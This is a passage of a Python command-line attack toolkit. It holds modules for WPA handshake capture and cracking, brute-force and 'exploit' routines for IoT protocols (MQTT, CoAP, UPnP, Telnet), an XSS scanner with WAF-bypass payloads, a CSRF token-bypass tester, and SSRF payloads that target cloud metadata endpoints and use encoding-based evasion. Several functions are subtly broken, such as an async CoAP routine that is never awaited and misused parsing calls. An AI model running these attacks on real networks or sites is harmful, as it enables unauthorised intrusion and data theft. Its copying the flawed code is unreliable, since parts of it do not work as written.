            click.echo(click.style(f"[!] Error enabling monitor mode: {e}", fg="red"))
            return
    
    if capture:
        click.echo(click.style(f"[!] Capturing handshake packets on {interface} ...", fg="blue"))
        try:
            packets = sniff(iface=interface, timeout=60)
            wrpcap(output, packets)
            click.echo(click.style(f"[!] Handshake capture successfully saved to {output}.", fg="green"))
        except Exception as e:
            click.echo(click.style(f"[!] Error capturing handshake: {e}", fg="red"))
            return
    
    if crack:
        click.echo(click.style("[*] Cracking WPA/WPA2 passwords ...", fg="blue"))
        try:
            subprocess.run(["aircrack-ng", output, "-w", crack], check=True) #REQUIREMENT = aircrack-ng
        except subprocess.CalledProcessError as e:
            click.echo(click.style(f"[!] Error during cracking: {e}", fg="red"))
            return
    
    if rogue:
        click.echo(click.style("[*] Detecting rogue access points ...", fg="blue"))
        try:
            packets = sniff(iface=interface, timeout=60)
            for packet in packets:
                if packet.haslayer(Dot11Beacon):
                    ssid = packet.info.decode()
                    bssid = packet.addr2
                    channel = int(ord(packet[Dot11Elt:3].info))
                    click.echo(click.style(f"[!] SSID: {ssid}, BSSID: {bssid}, Channel: {channel}", fg="green"))
        except Exception as e:
            click.echo(click.style(f"[!] Error detecting rogue APs: {e}", fg="red"))
            return
    
    if signal:
        click.echo(click.style("[*] Analysing signal strength ...", fg="blue"))
        try:
            packets = sniff(iface=interface, timeout=30)
            for packet in packets:
                if packet.haslayer(Dot11Beacon):
                    ssid = packet.info.decode()
                    rssi = -(256 - ord(packet.notdecoded[-4:-3]))
                    click.echo(click.style(f"[!] SSID: {ssid}, Signal: {rssi} dBm", fg="green"))
        except Exception as e:
            click.echo(click.style(f"[!] Error analysing signal strength: {e}", fg="red"))
            return
    
    if monitor:
        click.echo(click.style("[*] Disabling monitor mode ...", fg="blue"))
        try:
            subprocess.run(["airmon-ng", "stop", interface], check=True)
            click.echo(click.style(f"[-] Monitor mode disabled on {interface}", fg="red"))
        except subprocess.CalledProcessError as e:
            click.echo(click.style(f"[!] Error disabling monitor mode: {e}", fg="red"))
            return

#IOTSEC COMMAND
@cli.command()
@click.option("-t", "--target", required=True, help="Target network (e.g. 192.168.1.0/24).")
@click.option("-s", "--scan", is_flag=True, help="Scan IoT devices on network.")
@click.option("-e", "--exploit", is_flag=True, help="Exploit detected IoT devices.")
@click.option("-p", "--protocol", type=click.Choice(["telnet", "mqtt", "coap", "upnp"], case_sensitive=False), help="Choose protocol to target.")
@click.option("-u", "--username", default="admin", help="Username for authentication. Default = admin")
@click.option("-w", "--wordlist", type=click.Path(exists=True), help="Path to wordlist for Brute-Forcing passwords.")
def iotsec(target, scan, exploit, protocol, username, wordlist):
    click.echo(click.style("[*] Initializing IoTSec module ...", fg="blue"))
    if scan:
        click.echo(click.style(f"[*] Scanning target: {target}", fg="blue"))
        try:
            #Use ARP scanning to discover devices
            devices = discover_devices(target)
            click.echo(click.style(f"[!] Found {len(devices)} devices.", fg="green"))
            for ip, mac in devices:
                click.echo(click.style(f"Device: {ip} | MAC: {mac}", fg="yellow"))
                ports = [1883, 5683, 1900, 23] #MQTT, CoAP, UPNP, Telnet
                open_ports = scan_ports(ip, ports)
                if open_ports:
                    click.echo(click.style(f"[!] Open ports on {ip}: {open_ports}", fg="green"))
                else:
                    click.echo(click.style(f"[!] No open ports on {ip}.", fg="red"))
        except Exception as e:
            click.echo(click.style(f"[!] Error during scan: {e}", fg="red"))
    
    if exploit:
        if not protocol:
            click.echo(click.style("[!] Please specify a protocol to exploit (-p).", fg="red"))
            return
        if protocol == "telnet":
            exploit_telnet(target, username, wordlist)
        elif protocol == "mqtt":
            exploit_mqtt(target)
        elif protocol == "coap":
            exploit_coap(target)
        elif protocol == "upnp":
            exploit_upnp(target)

def discover_devices(target):
    devices = []
    try:
        scanner = subprocess.run(["arp-scan", "-l", target], capture_output=True, text=True) #REQUIREMENT = arp-scan
        for line in scanner.stdout.split("\n"):
            if ":" in line: #Check for MAC addresses
                parts = line.split()
                devices.append((parts[0], parts[1])) #IP and MAC
    except FileNotFoundError:
        raise Exception("arp-scan is not installed. Please install it first.")
    return devices

def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    return open_ports

#Exploit Telnet by Brute-Forcing weak credentials
def exploit_telnet(target, username, wordlist):
    click.echo(click.style(f"[!] Telnet protocol is no longer supported due to deprecation.", fg="red"))
"""
def exploit_telnet(target, username, wordlist):
    click.echo(click.style("[*] Exploiting Telnet ...", fg="blue"))
    devices = discover_devices(target)
    for ip, _ in devices:
        if 23 in scan_ports(ip, [23]):
            click.echo(click.style(f"[*] Attempting Telnet Brute Force on {ip} ...", fg="blue"))
            with open(wordlist, "r") as file:
                for password in file:
                    password = password.strip()
                    try:
                        telnet = telnetlib.Telnet(ip)
                        telnet.read_until(b"login: ")
                        telnet.write(username.encode("ascii") + b"\n")
                        telnet.read_until(b"Password: ")
                        telnet.write(password.encode("ascii") + b"\n")
                        result = telnet.read_all()
                        if "incorrect" not in result.decode("ascii").lower():
                            click.echo(click.style(f"[!] Found credentials: {username}:{password}", fg="green"))
                            telnet.close()
                            break
                        telnet.close()
                    except Exception:
                        pass
"""

#Exploit misconfigured MQTT brokers
def exploit_mqtt(target):
    click.echo(click.style("[*] Exploiting MQTT brokers ...", fg="blue"))
    devices = discover_devices(target)
    for ip, _ in devices:
        if 1883 in scan_ports(ip, [1883]):
            try:
                client = mqtt.Client()
                client.connect(ip, 1883, 60)
                client.loop_start()
                client.subscribe("#") #Subscribe to all topics
                click.echo(click.style(f"[!] Successfully subscribed to all topics on {ip}.", fg="green"))
            except Exception as e:
                click.echo(click.style(f"[!] Failed to exploit MQTT on {ip}. Error: {e}", fg="red"))

#Exploit CoAP by enumerating accessible resources
async def exploit_coap(target):
    click.echo(click.style("[*] Exploiting CoAP devices ...", fg="blue"))
    devices = discover_devices(target)
    for ip, _ in devices:
        if 5683 in scan_ports(ip, [5683]):
            click.echo(click.style(f"[*] Attempting CoAP resource enumeration on {ip} ...", fg="blue"))
            try:
                protocol = await Context.create_client_context()
                request = Message(code=GET, uri=f"coap://{ip}/.well-known/core")
                response = await protocol.request(request).response
                click.echo(click.style(f"[!] Found resources on {ip}: {response.payload.decode()}", fg="green"))
            except Exception as e:
                click.echo(click.style(f"[!] Failed to retrieve CoAP resources on {ip}. Error: {e}", fg="red"))

#Exploit UPnP by discovering services and extracting device details
def exploit_upnp(target):
    click.echo(click.style("[*] Exploiting UPnP devices ...", fg="blue"))
    upnp_discovery_msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "ST: ssdp:all\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 2\r\n"
        "\r\n"
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.settimeout(5)
    try:
        s.sendto(upnp_discovery_msg.encode(), ("239.255.255.250", 1900))
        while True:
            try:
                response, addr = s.recvfrom(65507)
                response = response.decode(errors="ignore")
                if "LOCATION" in response:
                    location = None
                    for line in response.split("\r\n"):
                        if line.startswith("LOCATION:"):
                            location = line.split(" ", 1)[1].strip()
                    if location:
                        click.echo(click.style(f"[!] Successfully found UPnP device at {addr[0]} - {location}", fg="green"))
                        extract_upnp_info(location)
            except socket.timeout:
                #break
                click.echo(click.style("[!] Error: Connection Timeout.", fg="red"))
    finally:
        s.close()

#Extract UPnP device details from the XML description file
def extract_upnp_info(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            root = ET.fromstring(response.content)
            dev_info = root.find(".//{urn:schemas-upnp-org:device-1-0}device")
            if dev_info:
                dev_name = dev_info.find("{urn:schemas-upnp-org:device-1-0}friendlyName").text
                dev_model = dev_info.find("{urn:schemas-upnp-org:device-1-0}modelName").text
                dev_manufacturer = dev_info.find("{urn:schemas-upnp-org:device-1-0}manufacturer").text
                click.echo(click.style(f"[!] Found device name: {dev_name}", fg="green"))
                click.echo(click.style(f"[!] Found device model: {dev_model}", fg="green"))
                click.echo(click.style(f"[!] Found device manufacturer: {dev_manufacturer}", fg="green"))
    except Exception as e:
        click.echo(click.style(f"[!] Failed to retrieve UPnP details. Error: {e}", fg="red"))

#XSSCAN COMMAND
XSS_PAYLOADS = [
    "<script>alert('Electra')</script>",
    "\"><script>alert('Electra')</script>",
    "';alert('Electra');//",
    "javascript:alert('Electra')",
    "<img src=x onerror=alert('Electra')>"
]

@cli.command()
@click.option("-u", "--url", required=True, help="Target URL to scan.")
@click.option("-p", "--payloads", type=click.Path(exists=True), help="File containing custom XSS payloads.")
@click.option("-m", "--method", type=click.Choice(["GET", "POST"], case_sensitive=False), default="GET", help="HTTP method to use.")
@click.option("-c", "--crawl", is_flag=True, help="Crawl the website to find additional parameters.")
@click.option("-h", "--headers", is_flag=True, help="Test XSS injection via HTTP headers like Referer and User-Agent.")
@click.option("-v", "--verbose", is_flag=True, help="Enable verbose mode for detailed output.")
@click.option("-b", "--bypass", is_flag=True, help="Use WAF bypass techniques.")
@click.option("-s", "--stored", is_flag=True, help="Test for stored XSS by submitting payloads in forms.")
@click.option("-d", "--dom", is_flag=True, help="Test for DOM-based XSS.")
@click.option("-t", "--threads", type=int, default=5, help="Number of threads for faster scanning.")
@click.option("--cookie", help="Optional session cookie for authenticated scanning.")
@click.option("--proxy", help="Proxy URL for stealth scanning (e.g. http://127.0.0.1:8000).")
def xsscan(url, payloads, method, crawl, headers, verbose, bypass, stored, dom, threads, cookie, proxy):
    click.echo(click.style(f"[*] Scanning target: {url}", fg="blue"))
    #Load custom payloads
    if payloads:
        with open(payloads, "r", encoding="utf-8") as file:
            custom_payloads = [line.strip() for line in file.readlines()]
        click.echo(click.style(f"[*] Using custom payloads.\n", fg="blue"))
    else:
        custom_payloads = XSS_PAYLOADS
        click.echo(click.style(f"[*] Using default payloads.\n", fg="blue"))
    
    #Use bypass payloads
    if bypass:
        custom_payloads.extend([
            "<ScRipT>alert('Electra')</ScRipT>",
            "<svg/onload=alert('Electra')>",
            "<iframe src=javascript:alert('Electra')>"
        ])
        click.echo(click.style(f"[*] Using WAF bypass techniques (scripts).", fg="blue"))
    
    #Set up session, headers and proxy
    session = requests.Session()
    if cookie:
        session.headers.update({"Cookie": cookie})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    #Find parameters in URL
    params = extract_params(url)
    if params:
        click.echo(click.style(f"[!] Found parameters: {params}", fg="green"))
    else:
        click.echo(click.style(f"[!] No parameters found. Try adding manually.", fg="red"))
    
    #Scan parameters for XSS
    """
    for param in params:
        for payload in custom_payloads:
            target_url = inject_payload(url, param, payload)
            if method == "GET":
                response = requests.get(target_url)
            else: #POST request
                response = requests.post(url, data={param: payload})
            
            #response = requests.get(target_url) if method == "GET" else requests.post(url, data={param: payload})
            
            if is_vulnerable(response, payload):
                click.echo(click.style(f"[!] XSS detected on {target_url} with payload: {payload}", fg="green"))
    """

    #Scan parameters for XSS using threads
    def scan_payload(param, payload):
        target_url = inject_payload(url, param, payload)
        if method == "GET":
            response = session.get(target_url, proxies=proxies)
        else:
            response = session.post(url, data={param: payload}, proxies=proxies)
        if is_vulnerable(response, payload):
            click.echo(click.style(f"[!] XSS detected on {target_url} with payload: {payload}", fg="green"))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for param in params:
            for payload in custom_payloads:
                executor.submit(scan_payload, param, payload)
    
    #Crawl website
    if crawl:
        discovered_links = crawl_website(url)
        click.echo(click.style("\n[*] Crawling completed!", fg="blue"))
        click.echo(click.style(f"[!] Discovered {len(discovered_links)} links.", fg="green"))
    
    #Test header injections
    if headers:
        header_payloads = {"User-Agent": "<script>alert('Electra')</script>", "Referer": "javascript:alert('Electra')"}
        response = requests.get(url, headers=header_payloads)
        if is_vulnerable(response, "<script>alert('Electra')</script>"):
            click.echo(click.style(f"\n[!] Header-based XSS detected on {url}", fg="green"))

    #Test for stored XSS
    if stored:
        stored_xss(url, custom_payloads)
    
    #Test for DOM-based XSS
    if dom:
        dom_xss(url, custom_payloads)

    click.echo(click.style(f"\n[*] XSS scan completed.", fg="blue"))

#Extract GET parameters from target URL
def extract_params(url):
    parsed_url = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed_url.query).keys())

#Inject XSS payload into a URL parameter
def inject_payload(url, param, payload):
    parsed_url = list(urllib.parse.urlparse(url))
    query = dict(urllib.parse.parse_qsl(parsed_url[4]))
    query[param] = payload
    parsed_url[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(parsed_url)

def is_vulnerable(response, payload):
    return payload in response.text

def crawl_website(url):
    links = set()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        for link in soup.find_all("a", "href=True"):
            href = link["href"]
            if href.startswith("http"):
                links.add(href)
            else:
                links.add(urllib.parse.urljoin(url, href))
    except Exception as e:
        click.echo(click.style(f"[!] Crawling error: {e}", fg="red"))
    return links

def stored_xss(url, payloads):
    click.echo(click.style("\n[*] Testing for Stored XSS ...", fg="blue"))
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").upper()
        inputs = {field.get("name"): payloads[0] for field in form.find_all("input") if field.get("name")}
        if action:
            target = urllib.parse.urljoin(url, action)
            if method == "POST":
                requests.post(target, data=inputs)
            else:
                requests.get(target, params=inputs)
    
    #time.sleep(2)
    verification = requests.get(url)
    for payload in payloads:
        if payload in verification.text:
            click.echo(click.style(f"[!] Stored XSS detected at {url}", fg="green"))

def dom_xss(url, payloads):
    click.echo(click.style(f"\n[*] Testing for DOM-based XSS ...", fg="blue"))
    for payload in payloads:
        dom_url = f"{url}#{payload}"
        response = requests.get(dom_url)
        if is_vulnerable(response, payload):
            click.echo(click.style(f"[!] DOM-based XSS detected at {dom_url}", fg="green"))

#CRYPTAUDIT COMMAND
@cli.command()
@click.option("-f", "--file", required=True, help="File containing cryptographic keys or TLS configurations.")
@click.option("-k", "--key", is_flag=True, help="Check cryptographic key strength.")
@click.option("-a", "--algorithm", is_flag=True, help="Check for weak or deprecated cryptographic algorithms.")
@click.option("-p", "--padding", is_flag=True, help="Identify improper padding in encrypted data.")
@click.option("-c", "--cert", is_flag=True, help="Audit SSL/TLS configurations.")
def cryptaudit(file, key, algorithm, padding, cert):
    if key:
        check_key(file)
    if algorithm:
        check_algorithm(file)
    if padding:
        check_padding(file)
    if cert:
        check_cert(file)

def check_key(file):
    #Check cryptographic key strength from a PEM file
    try:
        with open(file, "rb") as f:
            key_data = f.read()
        private_key = load_pem_private_key(key_data, password=None, backend=default_backend())
        if isinstance(private_key, rsa.RSAPrivateKey):
            key_size = private_key.key_size
            if key_size < 2048:
                click.echo(click.style(f"[!] Weak RSA key detected! Size: {key_size} bits.", fg="green"))
            else:
                click.echo(click.style(f"[!] RSA key strength is sufficient. Size: {key_size} bits.", fg="red"))
    except Exception as e:
        click.echo(click.style(f"[!] Failed to analyse key. Error: {e}", fg="red"))

def check_algorithm(file):
    #Check weap or deprecated hashes and encryption algorithms
    weak_hashes = ["md5", "sha1"]
    with open(file, "r") as f:
        data = f.read().lower()
    for algorithm in weak_hashes:
        if algorithm in data:
            click.echo(click.style(f"[!] Weak or deprecated hashing algorithm detected: {algorithm.upper()}", fg="green"))

def check_padding(file):
    #Detects improper padding usage
    try:
        data = b" " * 16
        pad = padding.PKCS7(128).padder()
        padded_data = pad.update(data) + pad.finalize()
        click.echo(click.style("[!] Detected proper padding.", fg="red"))
    except Exception:
        click.echo(click.style("[!] Detected improper padding.", fg="green"))

def check_cert(domain):
    #Audit SSL/TLS configuration of given domain
    try:
        conn = ssl.create_connection((domain, 443))
        context = ssl.create_default_context()
        with context.wrap_socket(conn, server_hostname=domain) as sock:
            cert = sock.getpeercert(binary_form=True)
            x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert)
            expiry = x509.get_notAfter().decode("utf-8")
            click.echo(click.style(f"[!] TLS cert valid until: {expiry}", fg="yellow"))
    except Exception as e:
        click.echo(click.style(f"[!] TLS audit failed. Error: {e}", fg="red"))

#CSRF COMMAND
@cli.command()
@click.option("-u", "--url", required=True, help="Target URL.")
@click.option("-p", "--post", help="POST data to use in the request.") #default=None
@click.option("-c", "--cookie", help="Session cookie for authenticated requests.") #default=None
@click.option("-h", "--headers", help="Use custom headers in JSON format.") #default=None
@click.option("-d", "--detect", is_flag=True, help="Detect if CSRF protection exists.")
@click.option("-t", "--test", is_flag=True, help="Bypass CSRF protection.")
@click.option("--js", is_flag=True, help="Check for JS-based CSRF tokens.")
@click.option("--ajax", is_flag=True, help="Intercept AJAX-based CSRF tokens.")
def csrf(url, post, cookie, headers, detect, test, js, ajax):
    click.echo(click.style(f"[*] Checking for CSRF vulnerabilities on {url}", fg="blue"))
    session = requests.Session()
    req_headers = {}

    if headers:
        try:
            req_headers = json.loads(headers)
        except json.JSONDecodeError:
            click.echo(click.style("[!] Invalid headers format (use JSON).", fg="red"))
            return
    
    if cookie:
        req_headers["Cookie"] = cookie
    
    try:
        response = session.get(url, headers=req_headers)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            click.echo(click.style("\n[!] No forms detected on the page.", fg="red"))
            return
        click.echo(click.style(f"\n[!] Found {len(forms)} form(s).", fg="green"))

        for idx, form in enumerate(forms):
            action = form.get("action")
            method = form.get("method", "GET").upper()
            inputs = form.find_all("input")
            tokens = [i for i in inputs if "csrf" in (i.get("name", "") + i.get("id", "")).lower()]
            click.echo(click.style(f"\n[~] Form {idx + 1}: {action} (Method: {method})", fg="yellow"))

            if detect:
                if tokens:
                    click.echo(click.style(f"\n[!] Detected CSRF token: {tokens[0].get('name')}", fg="green"))
                else:
                    click.echo(click.style("\n[!] No CSRF token detected.", fg="red"))
            
            if test and tokens:
                token = tokens[0].get("value", "")
                data = {i.get("name", ""): i.get("value", "") for i in inputs if i.get("name")}

                if token:
                    del data[tokens[0].get("name")]
                click.echo(click.style("[*] Attempting CSRF bypass by submitting without token ...", fg="blue"))

                if method == "POST":
                    resp = session.post(url, data=data, headers=req_headers)
                else:
                    resp = session.get(url, params=data, headers=req_headers)
                
                if resp.status_code == 200:
                    click.echo(click.style("[!] Detected potential CSRF vulnerability. Request succeeded without a CSRF token.", fg="green"))
                else:
                    click.echo(click.style("[!] Detected effective CSRF protection.", fg="red"))

        if js:
            click.echo(click.style("\n[*] Checking JavaScript for CSRF tokens ...", fg="blue"))
            scripts = soup.find_all("script")
            js_tokens = []
            for script in scripts:
                script_text = script.string
                if script_text:
                    #Detect common JS CSRF token patterns
                    patterns = [
                        r"var\s+csrfToken\s*=\s*[\"'](.+?)[\"']",
                        r"window\.csrfToken\s*=\s*[\"'](.+?)[\"']",
                        r"csrf_token\s*:\s*[\"'](.+?)[\"']",
                        r"meta\[\"csrf-token\"\]\.content\s*=\s*[\"'](.+?)[\"']"
                    ]

                    for pattern in patterns:
                        match = re.search(pattern, script_text)
                        if match:
                            js_tokens.append(match.group(1))
            
            if js_tokens:
                click.echo(click.style(f"[!] Detected JS-based CSRF token(s): {', '.join(js_tokens)}", fg="green"))
            else:
                click.echo(click.style("[!] No JS-based CSRF tokens found.", fg="red"))

        if ajax:
            click.echo(click.style(f"\n[*] Intercepting AJAX requests for CSRF tokens ...", fg="blue"))
            ajax_patterns = [
                r"fetch\(\"(.*?)\"",
                r"XMLHttpRequest\(\);.*?\.open\(\"(.*?)\"",
                r"\$.ajax\(\s*{.*?url:\s*\"(.*?)\""
            ]

            endpoints = set()
            for script in scripts:
                script_text = script.string()
                if script_text:
                    for pattern in ajax_patterns:
                        matches = re.findall(pattern, script_text)
                        for match in matches:
                            endpoints.add(match)
            
            if endpoints:
                click.echo(click.style(f"[!] Found AJAX endpoints: {', '.join(endpoints)}", fg="green"))
                for endpoint in endpoints:
                    if not endpoint.startswith("http"):
                        endpoint = url.rstrip("/") + "/" + endpoint.lstrip("/")
                    click.echo(click.style(f"[*] Testing AJAX endpoint: {endpoint} ...", fg="blue"))
                    ajax_headers = req_headers.copy()
                    ajax_headers["X-Requested-With"] = "XMLHttpRequest"
                    test_resp = session.get(endpoint, headers=ajax_headers)
                    if test_resp.status_code == 200:
                        click.echo(click.style("[!] Detected possible CSRF vulnerability. AJAX request succeeded without a CSRF token.", fg="green"))
                    else:
                        click.echo(click.style("[!] Detected CSRF protection. AJAX request blocked.", fg="red"))
            else:
                click.echo(click.style("[!] No AJAX-based CSRF tokens found.", fg="red"))

    except Exception as e:
        click.echo(click.style(f"[!] Error: {e}", fg="red"))

#SSRF COMMAND
def ssrf_payloads():
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22/",
        "http://127.0.0.1:80/",
        "http://[::1]:80/",
        "http://0.0.0.0:80/",
        "http://192.168.1.1/",
        "http://internal-service/"
    ]

    encoded_payloads = []
    for payload in payloads:
        encoded_payloads.append(payload) #Base payloads
        encoded_payloads.append(urllib.parse.quote(payload)) #URL encoded
        encoded_payloads.append(urllib.parse.quote_plus(payload)) #URL encoded (+ instead of %20)
        encoded_payloads.append(payload.replace("http://", "http:\\/\\/")) #Slash escaped
        encoded_payloads.append(payload.replace(".", "[.]")) #Dot escaped
        encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload))) #Double encoded
        encoded_payloads.append("".join(random.choice([urllib.parse.quote(c), c]) for c in payload)) #Mixed encoded
        encoded_payloads.append("".join(f"%{hex(ord(c))[2:].zfill(2)}" for c in payload)) #Hex encoded
        encoded_payloads.append(base64.b64encode(payload.encode()).decode()) #Base64 encoded
    return list(set(encoded_payloads))

@cli.command()
@click.option("-u", "--url", required=True, help="Target URL.")
@click.option("-p", "--param", required=True, help="Parameter to inject on payloads.")
@click.option("-h", "--header", multiple=True, help="Custom headers to include in requests.")
@click.option("--proxy", help="Proxy to use (e.g. http://127.0.0.1:8000).")
def ssrf(url, param, header, proxy):
    headers = {h.split(":")[0].strip(): h.split(":")[1].strip() for h in header}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    payloads = ssrf_payloads()

    click.echo(click.style("[*] Scanning for SSRF vulnerabilities ...\n", fg="blue"))
    for payload in payloads:
        params = {param: payload}
        try:
            response = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=5)
            try:
                json_response = response.json()
                click.echo(click.style(f"[~] Payload: {payload}, Status Code: {response.status_code}", fg="yellow"))
                #if response.status_code in [200, 302] and any(keyword in response.text.lower() for keyword in ["meta-data", "ssh", "internal", "electra"]):
                if response.status_code in [200, 302] and any(keyword in str(json_response).lower() for keyword in ["meta-data", "ssh", "internal", "ssrf", "attacked", "electra"]):
                    click.echo(click.style(f"[!] Detected possible SSRF with payload: {payload}", fg="green"))
            except ValueError:
                if response.status_code in [200, 302] and any(keyword in response.text.lower() for keyword in ["meta-data", "ssh", "internal", "ssrf", "attacked", "electra"]):
                    click.echo(click.style(f"[!] Detected possible SSRF with payload: {payload}", fg="green"))
        except requests.exceptions.RequestException as e:
            click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
    
    click.echo(click.style("\n[*] SSRF scan completed.", fg="blue"))

if __name__ == "__main__":
    cli()